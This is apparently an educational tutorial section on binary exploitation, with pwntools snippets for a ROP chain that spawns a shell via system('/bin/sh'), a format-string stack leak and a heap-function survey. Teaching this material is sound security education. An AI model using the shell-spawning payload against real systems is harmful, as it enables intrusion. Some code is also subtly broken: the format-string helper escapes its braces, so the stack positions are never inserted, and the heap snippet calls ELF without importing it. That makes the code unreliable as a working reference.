# Advanced Topics (Brief Overview)

### Return Oriented Programming (ROP)

When direct code injection isn't possible due to protections like NX bit:

```python
# File: rop_example.py
#!/usr/bin/env python3

"""
Basic ROP Chain Example
"""

from pwn import *

# Load binary and find gadgets
elf = ELF('./binary')
rop = ROP(elf)

# Build ROP chain to call system('/bin/sh')
binsh = next(elf.search(b'/bin/sh'))  # Find '/bin/sh' string
rop.call('system', [binsh])

# Create payload
offset = 40
payload = b'A' * offset + bytes(rop)
```

### Format String Exploitation

Advanced technique for information leaks and arbitrary writes:

```python
# File: format_string_advanced.py
#!/usr/bin/env python3

"""
Format String Exploitation Example
"""

from pwn import *

def leak_stack(p, positions):
    """Leak stack values at specific positions"""
    payload_str = 'AAAA' + ''.join([f'%{{p}}$p,' for p in positions])
    payload = payload_str.encode()

    p.sendline(payload)
    response = p.recvline()

    # Parse leaked addresses
    leaked = []
    for addr_str in response.split(b',')[:-1]:
        if addr_str.startswith(b'0x'):
            leaked.append(int(addr_str, 16))

    return leaked

# Example usage for leaking addresses
# p = process('./format_vuln')
# addresses = leak_stack(p, [6, 7, 8, 9, 10])
```

### Heap Exploitation

Advanced topic involving dynamic memory corruption:

```python
# File: heap_exploitation_basics.py
#!/usr/bin/env python3

"""
Basic Heap Exploitation Concepts

Common heap vulnerabilities:
1. Use After Free (UAF)
2. Double Free
3. Heap Overflow
4. Format String on Heap
"""

# Example of detecting heap vulnerabilities
def analyze_heap_functions(binary_path):
    """Analyze binary for heap-related functions"""
    dangerous_funcs = [
        'malloc', 'free', 'realloc', 'calloc',
        'new', 'delete'  # C++ operators
    ]

    elf = ELF(binary_path)
    found_funcs = []

    for func in dangerous_funcs:
        if func in elf.got:
            found_funcs.append(func)

    return found_funcs

# Heap exploitation requires deep understanding of:
# - Heap internals (glibc malloc, ptmalloc2)
# - Chunk structures
# - Free list management
# - Heap metadata corruption techniques
```
